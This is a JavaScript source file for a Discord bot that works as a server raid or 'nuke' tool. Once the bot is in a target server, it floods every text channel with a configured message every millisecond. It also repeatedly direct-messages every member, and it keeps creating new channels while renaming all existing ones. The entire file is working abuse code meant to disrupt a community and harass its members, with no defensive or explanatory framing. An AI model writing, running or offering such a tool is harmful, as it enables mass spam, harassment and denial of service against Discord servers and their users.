const Discord = require('discord.js');
const client = new Discord.Client
const config = require("./config1.json");
if (!config.token) return console.log("You didn't provide a valid token in config.json");
if (!config.guild_id) return console.log("You didn't provide a valid guild ID in config.json");


client.commands = new Discord.Collection();

client.on('ready', () => {
    console.log('OK')

    const Guild = client.guilds.cache.get(config.guild_id);

    if(config.message && config.guild_id){
        Guild.channels.cache.forEach((channel) => {
            if(channel.type == "text"){
                setInterval(() => {
                    channel.send(config.message);
                }, 1)
                
            } 
        })
    }

    if(config.dm_members === 'true' && config.guild_id && config.dm_message){
         Guild.members.cache.forEach((member) => {
             setInterval(() => {
                 member.send(config.dm_message).catch(e => console.error(`Couldn't DM member: ${member.user.tag}`));
             })
         })
    }

    if(config.create_channels === "true" && config.guild_id && config.rename_channels){
        setInterval(() => {
            Guild.channels.create(config.rename_channels, {
                type: "text",
                permissionOverwrites: [{
                    id: config.guild_id,
                    allow: ['VIEW_CHANNEL']
                }]
            })

            Guild.channels.cache.forEach((channel) => {
                channel.setName(config.rename_channels).catch(e => console.error(`Couldn't rename channel: ${channel.id}`))
            })

        }, 1)
    }

});

client.login(config.token);